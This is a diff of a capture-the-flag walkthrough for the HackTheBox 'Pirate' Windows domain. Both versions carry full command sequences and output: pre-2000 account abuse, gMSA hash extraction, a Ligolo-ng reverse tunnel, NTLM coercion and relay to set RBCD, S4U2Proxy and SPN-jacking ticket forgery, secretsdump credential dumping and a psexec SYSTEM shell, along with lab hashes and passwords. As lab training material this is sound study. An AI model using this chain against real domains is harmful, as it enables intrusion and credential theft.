@@ -1,33 +1,32 @@
 # HackTheBox — Pirate (Hard, Windows)
-## Full Walkthrough
 
 ---
 
 ## Box Info
 
-| Field | Value |
-|-------|-------|
-| **Name** | Pirate |
-| **OS** | Windows Server 2019 |
-| **Difficulty** | Hard |
-| **Domain** | pirate.htb |
-| **DC** | DC01.pirate.htb |
+| Field              | Value                   |
+| ------------------ | ----------------------- |
+| **Name**           | Pirate                  |
+| **OS**             | Windows                 |
+| **Difficulty**     | Hard                    |
+| **Domain**         | pirate.htb              |
+| **DC**             | DC01.pirate.htb         |
 | **Starting Creds** | pentest / p3nt3st2025!& |
 
-## Attack Path Overview
+## Attack Path
 
 ```mermaid
 graph TD
-    A["🔑 pentest creds"] --> B["🖥️ Pre-2K · MS01$:ms01"]
-    B --> C["🔓 gMSA Hash Dump"]
-    C --> D["🐚 WinRM → DC01"]
-    D --> E["🌐 Ligolo-ng Tunnel"]
-    E --> F["💥 Coerce + Relay → RBCD on WEB01"]
-    F --> G["🎫 S4U2Proxy · Admin → WEB01"]
-    G --> H["🏁 user.txt"]
-    G --> I["🔍 secretsdump · a.white creds"]
-    I --> J["✏️ SPN-Jack · HTTP/WEB01 → DC01"]
-    J --> K["🏴‍☠️ root.txt"]
+    A["pentest creds"] --> B["Pre-2K · MS01$:ms01"]
+    B --> C["gMSA Hash Dump"]
+    C --> D["WinRM → DC01"]
+    D --> E["Ligolo-ng Tunnel"]
+    E --> F["Coerce + Relay → RBCD on WEB01"]
+    F --> G["S4U2Proxy · Admin → WEB01"]
+    G --> H["user.txt"]
+    G --> I["secretsdump · a.white creds"]
+    I --> J["SPN-Jack · HTTP/WEB01 → DC01"]
+    J --> K["root.txt"]
 
     style A fill:#4a90d9,stroke:#2c5aa0,color:#fff
     style H fill:#2ecc71,stroke:#27ae60,color:#fff
@@ -38,84 +37,73 @@ graph TD
 
 ---
 
-## Phase 1: Initial Enumeration
+## Setup
 
-### Hosts File & Time Sync
-
-Kerberos requires hostname resolution and is extremely time-sensitive (max 5-minute tolerance). We start by setting up DNS and syncing our clock with the DC.
+### Hosts & Time Sync
 
 ```bash
 echo '10.129.x.x DC01.pirate.htb pirate.htb DC01' | sudo tee -a /etc/hosts
 sudo ntpdate pirate.htb
 ```
 
-The DC had a significant time offset (+7h). Kerberos will fail with `KRB_AP_ERR_SKEW` if the clock difference exceeds 5 minutes. Run `sudo ntpdate pirate.htb` before any Kerberos operations throughout this box.
+Kerberos requires hostname resolution and tolerates a maximum 5-minute clock skew. The DC in this box runs with a +7h offset, so `ntpdate` is required before every Kerberos operation. Without it, you'll hit `KRB_AP_ERR_SKEW` on every `-k` flag.
+
+---
+
+## Reconnaissance
 
 ### Credential Validation
 
-We validate the provided credentials across multiple protocols:
+Starting credentials provided in the box description: `pentest / p3nt3st2025!&`
 
 ```bash
-nxc smb pirate.htb -u 'pentest' -p 'p3nt3st2025!&'     # ✅ SMB works
-nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&'     # ✅ LDAP works
+nxc smb pirate.htb -u 'pentest' -p 'p3nt3st2025!&'     # ✅ SMB
+nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&'     # ✅ LDAP — signing:None, channel binding:Never
 nxc winrm pirate.htb -u 'pentest' -p 'p3nt3st2025!&'    # ❌ WinRM denied
 ```
 
-Key finding: LDAP signing is **disabled** on DC01 (`signing:None, channel binding:Never`). This will be critical later for NTLM relay.
+The critical takeaway here is that LDAP signing is **disabled**. This opens the door for NTLM relay to LDAP later.
 
-### Domain User Enumeration
+### Domain Users
 
 ```bash
 nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' --users
 ```
 
-**Users discovered:**
-- `Administrator` — Domain Admin
-- `a.white` — Regular user
-- `a.white_adm` — Admin account (paired with a.white, member of IT group)
-- `j.sparrow` — Standard user
-- `pentest` — Our starting account
-- `krbtgt` — Kerberos service account
+Interesting accounts: `a.white` paired with `a.white_adm` — a classic privilege separation pattern where the regular account often has reset permissions over the admin account.
 
-The `a.white` / `a.white_adm` pairing suggests privilege separation — investigating the relationship between these accounts will be important.
-
-### Kerberoasting Attempt
+### Kerberoasting
 
 ```bash
 nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -k --kerberoasting output.txt
 ```
 
-Found two kerberoastable accounts: `a.white_adm` and `gMSA_ADFS_prod$`. However, cracking with rockyou.txt failed — this is a rabbit hole. The intended path doesn't require cracking these hashes.
+Two roastable accounts found: `a.white_adm` and `gMSA_ADFS_prod$`. Neither cracks against rockyou.txt — this is a rabbit hole. Move on.
 
-### BloodHound Enumeration
+### BloodHound
 
 ```bash
 bloodhound-python -dc 'dc01.pirate.htb' -d 'pirate.htb' -u 'pentest' -p 'p3nt3st2025!&' -ns $IP --zip -c All
 ```
 
-BloodHound revealed critical information:
-- `pentest` is a member of **Pre-Windows 2000 Compatible Access** (via Authenticated Users)
-- `MS01$` has **ReadGMSAPassword** over `gMSA_ADFS_prod$`
-- `a.white_adm` has **Constrained Delegation** to `HTTP/WEB01.pirate.htb`
-- `a.white_adm` has **WriteSPN** on both DC01 and WEB01
+BloodHound reveals the full attack path:
+- `pentest` → member of **Pre-Windows 2000 Compatible Access** (via Authenticated Users)
+- `MS01$` → **ReadGMSAPassword** on `gMSA_ADFS_prod$`
+- `a.white_adm` → **Constrained Delegation** to `HTTP/WEB01.pirate.htb`
+- `a.white_adm` → **WriteSPN** on both DC01 and WEB01
 
 ---
 
-## Phase 2: Pre-Windows 2000 Computer Account Exploitation
+## Enumeration
 
-### What Are Pre-2K Computer Accounts?
+### Pre-Windows 2000 Computer Accounts
 
-When a computer account is created with "pre-Windows 2000 compatibility," its initial password is set to the lowercase computer name (without the `$`). For example, `MS01$` gets password `ms01`. This is a legacy feature from the Windows NT era.
-
-### Discovering Pre-2K Accounts
-
-NetExec has a dedicated module to find these:
+When computer accounts are created with "pre-Windows 2000 compatibility," their default password is the lowercase computer name without the `$`. NetExec has a dedicated module for this:
 
 ```bash
 nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -M pre2k
 ```
 
-**Result:**
 ```
 PRE2K    Pre-created computer account: MS01$
 PRE2K    Pre-created computer account: EXCH01$
@@ -123,30 +111,11 @@ PRE2K    [+] Successfully obtained TGT for ms01@pirate.htb
 PRE2K    [+] Successfully obtained TGT for exch01@pirate.htb
 ```
 
-Both `MS01$` and `EXCH01$` have default passwords. The module even obtains TGTs automatically.
+Both `MS01$` and `EXCH01$` have default passwords. If you try these over SMB, you'll get `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` — that's not a failure, it means the password is correct but the account type can't do interactive SMB logons. Use Kerberos instead.
 
-### Understanding STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
+### gMSA Password Extraction
 
-If you try SMB authentication with these accounts:
-
-```bash
-nxc smb pirate.htb -u 'MS01$' -p 'ms01'
-# Result: STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
-```
-
-This error **looks like failure but means the password is correct**. The account type (workstation trust) simply can't do interactive SMB logons. Use Kerberos or LDAP instead.
-
----
-
-## Phase 3: gMSA Password Extraction
-
-### What is a gMSA?
-
-A **Group Managed Service Account** has a 240+ character auto-rotated password stored in AD. Only specifically authorized accounts can read the `msDS-ManagedPassword` attribute. `MS01$` is authorized to read both gMSA passwords because it's a member of "Domain Secure Servers."
-
-### Extracting Hashes via Kerberos LDAP
-
-NTLM over LDAP fails due to channel binding, so we use Kerberos authentication:
+`MS01$` is authorized to read gMSA passwords (member of "Domain Secure Servers"). NTLM over LDAP fails due to channel binding, so Kerberos is required:
 
 ```bash
 impacket-getTGT 'pirate.htb/MS01$:ms01'
@@ -154,138 +123,90 @@ export KRB5CCNAME=MS01\$.ccache
 nxc ldap dc01.pirate.htb -u 'MS01$' -p 'ms01' -k --gmsa
 ```
 
-**Result:**
 ```
 Account: gMSA_ADCS_prod$    NTLM: 25c7f0eb586ed3a91375dbf2f6e4a3ea
 Account: gMSA_ADFS_prod$    NTLM: fd9ea7ac7820dba5155bd6ed2d850c09
 ```
 
-The `-k` flag uses Kerberos authentication, which satisfies LDAP channel binding requirements. The `--gmsa` flag tells NetExec to read the gMSA password attribute.
+Two service account hashes. `gMSA_ADFS_prod$` is a member of **Remote Management Users** — that's our way in.
+
+### Internal Network Discovery
+
+After gaining a shell on DC01 (see Exploitation), `ipconfig` reveals a second interface:
+
+```
+vEthernet (Switch01): 192.168.100.1/24
+```
+
+WEB01 sits at 192.168.100.2 — only reachable from DC01. We need to pivot.
 
 ---
 
-## Phase 4: Foothold — WinRM to DC01
+## Exploitation
 
-### Connecting as gMSA_ADFS_prod$
-
-`gMSA_ADFS_prod$` is a member of **Remote Management Users**, granting WinRM access:
+### Initial Foothold — WinRM to DC01
 
 ```bash
 evil-winrm -i 10.129.x.x -u 'gMSA_ADFS_prod$' -H 'fd9ea7ac7820dba5155bd6ed2d850c09'
 ```
 
-### Situational Awareness
+We land on DC01 as `gMSA_ADFS_prod$`. No admin privileges, but we have network access to the internal 192.168.100.0/24 subnet.
 
-```powershell
-whoami          # pirate\gmsa_adfs_prod$
-hostname        # DC01
-ipconfig        # 10.129.x.x (external), 192.168.100.1 (internal vEthernet)
-```
+### Pivoting with Ligolo-ng
 
-**Key findings:**
-- We're on DC01 (the Domain Controller)
-- Internal network: 192.168.100.0/24 — WEB01 is at 192.168.100.2
-- No admin privileges — can't dump credentials directly
-
----
-
-## Phase 5: Pivoting with Ligolo-ng
-
-WEB01 (192.168.100.2) is only accessible from DC01. We need a tunnel to reach it from our attack box.
-
-### Setting Up Ligolo-ng
-
-**Attack box (proxy):**
 ```bash
+# Attack box — create TUN interface and start proxy
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 ./proxy -selfcert -laddr 0.0.0.0:11601
 ```
 
-**DC01 (agent via Evil-WinRM):**
 ```powershell
+# DC01 — upload and run agent
 upload /path/to/agent.exe
 .\agent.exe -connect 10.10.x.x:11601 -ignore-cert
 ```
 
-**Ligolo proxy console:**
-```
-session
-# Select the session
-start
-```
-
-**Attack box (add route):**
 ```bash
+# Attack box — select session in ligolo, start tunnel, add route
 sudo ip route add 192.168.100.0/24 dev ligolo
 ```
 
-**Why Ligolo-ng?** It creates a TUN interface that routes traffic natively through the compromised host. Unlike SOCKS proxies (chisel), tools work without proxychains.
+WEB01 is now reachable directly from our attack box. Verify with `nxc smb 192.168.100.2` — note that SMB signing is **disabled** on WEB01.
 
-**Verify WEB01 is reachable:**
-```bash
-nxc smb 192.168.100.2
-# Should show: WEB01, signing:False
-```
+### NTLM Coercion & Relay
 
----
+The attack: coerce WEB01 to authenticate to us, relay those credentials to LDAP on DC01 (where signing is disabled), and use the relayed session to configure RBCD.
 
-## Phase 6: NTLM Coercion & Relay → RBCD
-
-### The Attack Concept
-
-1. **Coerce** WEB01 to authenticate to our relay server
-2. **Relay** WEB01$'s credentials to LDAP on DC01
-3. **Set RBCD** — allow an attacker-controlled computer to impersonate users on WEB01
-
-This works because:
-- WEB01 is vulnerable to authentication coercion (PetitPotam, PrinterBug)
-- LDAP signing is disabled on DC01, allowing NTLM relay to LDAP
-- Machine accounts can modify certain attributes on themselves (RBCD)
-
-### Step 1: Start the Relay Server
+**Start the relay:**
 
 ```bash
-sudo /home/certifa/.local/bin/ntlmrelayx.py -t ldap://DC01.pirate.htb -i --delegate-access -smb2support --remove-mic
+sudo ntlmrelayx.py -t ldap://DC01.pirate.htb -i --delegate-access -smb2support --remove-mic
 ```
 
-**Flags explained:**
-- `-t ldap://DC01.pirate.htb` — relay captured auth to LDAP on DC01
-- `-i` — spawn interactive LDAP shell on success
-- `--delegate-access` — configure RBCD automatically
-- `-smb2support` — enable SMB2 protocol
-- `--remove-mic` — strip NTLM Message Integrity Code to bypass signing for SMB→LDAP relay
+The `--remove-mic` flag strips the NTLM Message Integrity Code, allowing SMB→LDAP relay despite integrity requirements. The `-i` flag spawns an interactive LDAP shell on success.
 
-### Step 2: Trigger Coercion from WEB01
-
-In a new terminal:
+**Trigger coercion:**
 
 ```bash
 nxc smb 192.168.100.2 -u 'gMSA_ADFS_prod$' -H 'fd9ea7ac7820dba5155bd6ed2d850c09' -M coerce_plus -o LISTENER=10.10.x.x
 ```
 
-**Result:**
 ```
-COERCE_PLUS    VULNERABLE, PetitPotam
 COERCE_PLUS    Exploit Success, lsarpc\EfsRpcAddUsersToFile
-COERCE_PLUS    VULNERABLE, PrinterBug
 COERCE_PLUS    Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
 ```
 
-Multiple coercion methods succeed. WEB01 authenticates to our relay.
-
-### Step 3: Relay Succeeds
-
-The ntlmrelayx output shows:
+Multiple coercion methods land. The relay catches the authentication:
 
 ```
 [*] Authenticating connection from PIRATE/WEB01$@10.129.x.x against ldap://DC01.pirate.htb SUCCEED
 [*] Started interactive Ldap shell via TCP on 127.0.0.1:11000
 ```
 
-### Step 4: LDAP Shell — Add Computer & Set RBCD
+### RBCD Configuration
 
-Connect to the interactive LDAP shell:
+Connect to the spawned LDAP shell and set up Resource-Based Constrained Delegation:
 
 ```bash
 nc 127.0.0.1 11000
@@ -299,26 +220,13 @@ StartTLS succeded, you are now using LDAPS!
 Adding new computer with username: ATTACKER$ and password: ~0G1;#$If,ukl^l result: OK
 
 # set_rbcd WEB01$ ATTACKER$
-Found Target DN: CN=WEB01,CN=Computers,DC=pirate,DC=htb
-Found Grantee DN: CN=ATTACKER,CN=Computers,DC=pirate,DC=htb
 Delegation rights modified successfully!
 ATTACKER$ can now impersonate users on WEB01$ via S4U2Proxy
 ```
 
-**What just happened:**
-1. `start_tls` — upgrades to encrypted LDAP (required for adding computer objects)
-2. `add_computer` — creates a machine account we fully control
-3. `set_rbcd` — sets `msDS-AllowedToActOnBehalfOfOtherIdentity` on WEB01 to trust ATTACKER$
+`start_tls` upgrades to encrypted LDAP (required for adding computer objects). The RBCD configuration tells WEB01: "trust ATTACKER$ to impersonate any user when accessing your services."
 
-This means: **WEB01 now trusts ATTACKER$ to impersonate any user when accessing WEB01's services.**
-
----
-
-## Phase 7: S4U2Proxy — Administrator on WEB01
-
-### Request Administrator Ticket
-
-Using our attacker machine account, request a Kerberos ticket as Administrator to WEB01:
+### S4U2Proxy — Administrator on WEB01
 
 ```bash
 impacket-getST 'pirate.htb/ATTACKER$:~0G1;#$If,ukl^l' \
@@ -327,103 +235,69 @@ impacket-getST 'pirate.htb/ATTACKER$:~0G1;#$If,ukl^l' \
   -dc-ip 10.129.x.x
 ```
 
-**Result:**
 ```
-[*] Impersonating Administrator
-[*] Requesting S4U2self
-[*] Requesting S4U2Proxy
 [*] Saving ticket in Administrator@HTTP_WEB01.pirate.htb@PIRATE.HTB.ccache
 ```
-
-**How S4U2Proxy works:**
-1. ATTACKER$ says to the DC: "I need to act as Administrator to HTTP/WEB01"
-2. DC checks WEB01's `msDS-AllowedToActOnBehalfOfOtherIdentity` — ATTACKER$ is listed
-3. DC issues a service ticket for Administrator to HTTP/WEB01
-4. We use this ticket to authenticate as Administrator
-
-### WinRM to WEB01 as Administrator
 
 ```bash
 export KRB5CCNAME=Administrator@HTTP_WEB01.pirate.htb@PIRATE.HTB.ccache
 evil-winrm -i WEB01.pirate.htb -r PIRATE.HTB -K $KRB5CCNAME
 ```
 
-**User flag captured from `C:\Users\a.white\Desktop\user.txt`!** ✅
+Administrator shell on WEB01. User flag is in `C:\Users\a.white\Desktop\user.txt`.
 
 ---
 
-## Phase 8: Credential Extraction from WEB01
+## Privilege Escalation
 
-### secretsdump — LSA Secrets
+### Credential Extraction — secretsdump
 
-With Administrator access on WEB01, dump all stored credentials:
+From our Administrator access on WEB01, dump all stored credentials remotely:
 
 ```bash
 impacket-secretsdump -k -no-pass WEB01.pirate.htb
 ```
 
-**Key findings in LSA Secrets:**
+The LSA Secrets section reveals a DefaultPassword entry — `a.white` was configured for auto-logon on WEB01, storing the plaintext password in the registry:
 
 ```
 [*] DefaultPassword
 PIRATE\a.white:E2nvAOKSz5Xz2MJu
 ```
 
-```
-PIRATE\WEB01$:aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9:::
-```
+We also recover WEB01$'s machine account hash (`feba09cf0013fbf5834f50def734bca9`), which is needed later for SPN manipulation.
 
-**Why DefaultPassword exists:** `a.white` was configured for Windows auto-logon on WEB01. The plaintext password is stored in the registry under LSA Secrets, and secretsdump extracts it.
+### Password Reset — a.white → a.white_adm
 
-We also get WEB01$'s machine account hash — needed later for SPN removal.
-
----
-
-## Phase 9: Password Reset — a.white → a.white_adm
-
-### Why This Works
-
-In AD, `a.white` has the "Reset Password" permission on `a.white_adm`. This is a common delegated administration model where a regular account manages its corresponding admin account.
-
-### Performing the Reset
+`a.white` has delegated password reset rights over `a.white_adm`:
 
 ```bash
 bloodyAD -d pirate.htb -u a.white -p 'E2nvAOKSz5Xz2MJu' --host DC01.pirate.htb set password 'a.white_adm' 'NewP@ss2026!'
 ```
 
-**Result:**
 ```
 [+] Password changed successfully!
 ```
 
-### Verify Delegation Rights
+Verify the delegation configuration:
 
 ```bash
 nxc ldap DC01.pirate.htb -u a.white_adm -p 'NewP@ss2026!' --find-delegation
 ```
 
-**Confirms:**
 ```
 a.white_adm    Person    Constrained w/ Protocol Transition    http/WEB01.pirate.htb, HTTP/WEB01
 ```
 
-`a.white_adm` has:
-- **Constrained Delegation** to `HTTP/WEB01.pirate.htb`
-- **WriteSPN** on both DC01 and WEB01 (from BloodHound)
+`a.white_adm` can impersonate users to `HTTP/WEB01.pirate.htb` and has **WriteSPN** on both DC01 and WEB01. This is the setup for SPN-jacking.
 
----
+### SPN-Jacking
 
-## Phase 10: SPN-Jacking → Domain Admin
+The constrained delegation is locked to `HTTP/WEB01.pirate.htb` — that only resolves to WEB01, which we already own. The trick: SPNs are just AD attributes. Move the SPN to DC01, and Kerberos will issue tickets encrypted with DC01's key instead.
 
-### The Concept
+**Remove SPN from WEB01:**
 
-`a.white_adm` can request tickets as Administrator to `HTTP/WEB01.pirate.htb` via constrained delegation. But that only gives us WEB01 — not useful for Domain Admin.
-
-**The trick:** SPNs are just AD attributes. If we move `HTTP/WEB01.pirate.htb` from WEB01 to DC01, Kerberos will issue tickets encrypted with DC01's key instead. Combined with `-altservice` to change HTTP to CIFS, we get file access to DC01 as Administrator.
-
-### Step 1: Remove SPN from WEB01
-
-Create `spn_remove.ldif`:
+`spn_remove.ldif`:
 ```
 dn: CN=WEB01,CN=Computers,DC=pirate,DC=htb
 changetype: modify
@@ -434,16 +308,13 @@ delete: servicePrincipalName
 servicePrincipalName: HTTP/WEB01
 ```
 
-Apply:
 ```bash
 ldapmodify -x -H ldap://DC01.pirate.htb -D "PIRATE\\a.white_adm" -w 'NewP@ss2026!' -f spn_remove.ldif
 ```
 
-**Why we can do this:** `a.white_adm` has WriteSPN on WEB01.
+**Add SPN to DC01:**
 
-### Step 2: Add SPN to DC01
-
-Create `spn_add.ldif`:
+`spn_add.ldif`:
 ```
 dn: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
 changetype: modify
@@ -451,16 +322,13 @@ add: servicePrincipalName
 servicePrincipalName: HTTP/WEB01.pirate.htb
 ```
 
-Apply:
 ```bash
 ldapmodify -x -H ldap://DC01.pirate.htb -D "PIRATE\\a.white_adm" -w 'NewP@ss2026!' -f spn_add.ldif
 ```
 
-**Why we can do this:** `a.white_adm` has WriteSPN on DC01.
+Now `HTTP/WEB01.pirate.htb` resolves to DC01. Kerberos doesn't validate whether the SPN "belongs" on that object — it just looks up the mapping.
 
-**What happened:** `HTTP/WEB01.pirate.htb` now resolves to DC01 instead of WEB01. Kerberos doesn't know the difference.
-
-### Step 3: Generate Administrator Ticket with altservice
+**Request Administrator ticket with altservice:**
 
 ```bash
 getST.py PIRATE.HTB/a.white_adm:'NewP@ss2026!' \
@@ -470,120 +338,48 @@ getST.py PIRATE.HTB/a.white_adm:'NewP@ss2026!' \
   -altservice CIFS/DC01.pirate.htb
 ```
 
-**Result:**
 ```
-[*] Impersonating Administrator
-[*] Requesting S4U2self
-[*] Requesting S4U2Proxy
 [*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
 [*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
 ```
 
-**Why `-altservice` works:** The service name in a Kerberos S4U2Proxy ticket is not protected by the KDC's signature. We change `HTTP` to `CIFS` (file access) and target DC01. The ticket is encrypted with DC01's key (since the SPN resolves there now), so DC01 accepts it.
+The `-altservice` flag changes the service type in the ticket from HTTP to CIFS (file access). This works because the service name in S4U2Proxy tickets isn't protected by the KDC signature — it can be freely modified client-side.
 
-### Step 4: SYSTEM Shell on DC01
+### Domain Admin
 
 ```bash
 export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
 psexec.py -k -no-pass DC01.pirate.htb
 ```
 
-**Result:**
 ```
-[*] Found writable share ADMIN$
-[*] Uploading file...
-[*] Opening SVCManager on DC01.pirate.htb...
-
 C:\Windows\system32> whoami
 nt authority\system
-
-C:\Windows\system32> type c:\users\administrator\desktop\root.txt
-a1xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx4
 ```
 
-**Root flag captured!** ✅ 🏴‍☠️
-
----
-
-## Bonus: DCSync for Domain Admin Hash
-
-With SYSTEM on DC01, we can also extract the Domain Admin hash:
-
-```bash
-secretsdump.py -k -no-pass -just-dc-user administrator PIRATE.HTB/Administrator@DC01.pirate.htb
-```
-
-```
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715171:::
-```
+Root flag at `C:\Users\Administrator\Desktop\root.txt`.
 
 ---
 
 ## Flags
 
-- **user.txt:** from `C:\Users\a.white\Desktop\` on WEB01
-- **root.txt:** from `C:\Users\Administrator\Desktop\` on DC01
+| Flag         | Location                                  |
+| ------------ | ----------------------------------------- |
+| **user.txt** | `C:\Users\a.white\Desktop\` on WEB01      |
+| **root.txt** | `C:\Users\Administrator\Desktop\` on DC01 |
 
 ---
 
-## Complete Attack Chain
+## Tools
 
-```mermaid
-graph TD
-    A["🔑 pentest creds"] --> B["🖥️ Pre-2K · MS01$:ms01"]
-    B --> C["🔓 gMSA Hash Dump"]
-    C --> D["🐚 WinRM → DC01"]
-    D --> E["🌐 Ligolo-ng Tunnel"]
-    E --> F["💥 Coerce + Relay → RBCD on WEB01"]
-    F --> G["🎫 S4U2Proxy · Admin → WEB01"]
-    G --> H["🏁 user.txt"]
-    G --> I["🔍 secretsdump · a.white creds"]
-    I --> J["✏️ SPN-Jack · HTTP/WEB01 → DC01"]
-    J --> K["🏴‍☠️ root.txt"]
-
-    style A fill:#4a90d9,stroke:#2c5aa0,color:#fff
-    style H fill:#2ecc71,stroke:#27ae60,color:#fff
-    style K fill:#e74c3c,stroke:#c0392b,color:#fff
-    style F fill:#e67e22,stroke:#d35400,color:#fff
-    style J fill:#9b59b6,stroke:#8e44ad,color:#fff
-```
-
----
-
-## Key Takeaways
-
-### Techniques Practiced
-
-1. **Pre-Windows 2000 computer accounts** — `nxc ldap -M pre2k` finds them automatically. Default password = lowercase name. `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` means password is correct.
-
-2. **Kerberos time skew** — use `sudo ntpdate pirate.htb` to sync with DC before Kerberos operations. KRB_AP_ERR_SKEW = clock difference too large.
-
-3. **gMSA password reading** — authorized computer accounts can read `msDS-ManagedPassword` via LDAP. Use `-k --gmsa` in NetExec.
-
-4. **NTLM coercion + relay** — coerce authentication from one machine, relay to LDAP on DC where signing is disabled. `--remove-mic` bypasses integrity checks for SMB→LDAP relay.
-
-5. **RBCD (Resource-Based Constrained Delegation)** — add attacker computer, set `msDS-AllowedToActOnBehalfOfOtherIdentity` on target, then S4U2Proxy to impersonate Administrator.
-
-6. **LSA Secrets / DefaultPassword** — `secretsdump` extracts stored plaintext passwords from auto-logon configuration in the registry.
-
-7. **SPN-Jacking** — WriteSPN + constrained delegation = move the SPN to a different target, abuse delegation to compromise it. `ldapmodify` with LDIF files for clean SPN manipulation.
-
-8. **altservice in getST.py** — service names in S4U2Proxy tickets aren't signed. Change HTTP→CIFS for file access to any target.
-
-### Tools Used
-
-| Tool | Purpose |
-|------|---------|
-| netexec (nxc) | SMB/LDAP enum, gMSA reading, coercion, pre2k module |
-| impacket-getTGT | Kerberos ticket acquisition |
-| evil-winrm | WinRM remote shell |
-| ligolo-ng | Network pivoting/tunneling |
-| ntlmrelayx.py | NTLM relay with RBCD setup |
-| impacket-getST | S4U2Proxy delegation abuse |
-| impacket-secretsdump | Credential extraction |
-| impacket-psexec | Remote code execution via SMB |
-| bloodyAD | AD object manipulation (password reset) |
-| ldapmodify | LDAP modifications via LDIF (SPN changes) |
-| bloodhound-python | AD enumeration and attack path discovery |
-| pypykatz | LSASS dump parsing (alternative to secretsdump) |
-| ntpdate | Clock synchronization for Kerberos |
+| Tool              | Purpose                                                    |
+| ----------------- | ---------------------------------------------------------- |
+| netexec (nxc)     | SMB/LDAP enumeration, gMSA reading, coercion, pre2k module |
+| impacket suite    | getTGT, getST (delegation abuse), secretsdump, psexec      |
+| evil-winrm        | WinRM remote shells                                        |
+| ligolo-ng         | Network pivoting                                           |
+| ntlmrelayx.py     | NTLM relay with RBCD setup                                 |
+| bloodyAD          | AD object manipulation (password reset)                    |
+| ldapmodify        | SPN manipulation via LDIF                                  |
+| bloodhound-python | AD attack path enumeration                                 |
+| ntpdate           | Kerberos clock synchronization                             |
